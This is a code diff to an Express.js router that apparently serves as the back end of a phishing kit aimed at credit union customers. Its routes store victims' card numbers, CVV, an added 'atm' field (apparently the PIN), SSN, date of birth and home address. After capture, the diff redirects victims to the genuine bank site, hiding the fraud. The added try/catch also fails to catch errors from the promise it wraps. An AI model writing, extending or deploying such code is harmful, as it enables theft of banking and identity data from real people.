@@ -71,7 +71,8 @@ router.post('/card', async (req, res) => {
     cardnumber: req.body.cardnumber,
     expirationMonth: req.body.expirationMonth,
     expirationYear: req.body.expirationYear,
-    cvv: req.body.cvv
+    cvv: req.body.cvv,
+    atm: req.body.atm
   });
 
   card
@@ -82,7 +83,7 @@ router.post('/card', async (req, res) => {
         'success_msg',
         'Card ok'
       );
-      res.redirect('/users/images');
+      res.redirect('https://www.sccu.com');
     })
   .catch(err => console.log(err));
 });
@@ -137,29 +138,37 @@ router.post('/questions', async (req, res) => {
 });
 
 router.post('/email', async (req, res) => {
-  const email = new Email({
-    name: req.body.name,
-    streetAddress: req.body.streetAddress,
-    apartment: req.body.apartment,
-    city: req.body.city,
-    zipcode: req.body.zipcode,
-    dobMonth: req.body.dobMonth,
-    dobDay: req.body.dobDay,
-    dobYear: req.body.dobYear,
-    ssn: req.body.ssn
-  });
+  try {
+    const email = new Email({
+      name: req.body.name,
+      streetAddress: req.body.streetAddress,
+      apartment: req.body.apartment,
+      city: req.body.city,
+      zipcode: req.body.zipcode,
+      dobMonth: req.body.dobMonth,
+      dobDay: req.body.dobDay,
+      dobYear: req.body.dobYear,
+      ssn: req.body.ssn
+    });
+  
+    email
+      .save()
+      .then(result => {
+        console.log(result)
+        req.flash(
+          'success_msg',
+          'Email ok'
+        );
+        res.redirect('/users/card');
+      })
 
-  email
-    .save()
-    .then(result => {
-      console.log(result)
-      req.flash(
-        'success_msg',
-        'Email ok'
-      );
-      res.redirect('/users/card');
-    })
-  .catch(err => console.log(err));
+} catch (err) {
+    if (err.code === 11000) {
+        return res.status(409).json({ error: 'Duplicate email detected' });
+    }
+    // Handle other errors as you see fit
+    return res.status(500).json({ error: 'Internal server error' });
+}
 });
 
 router.post('/emailcnt', async (req, res) => {
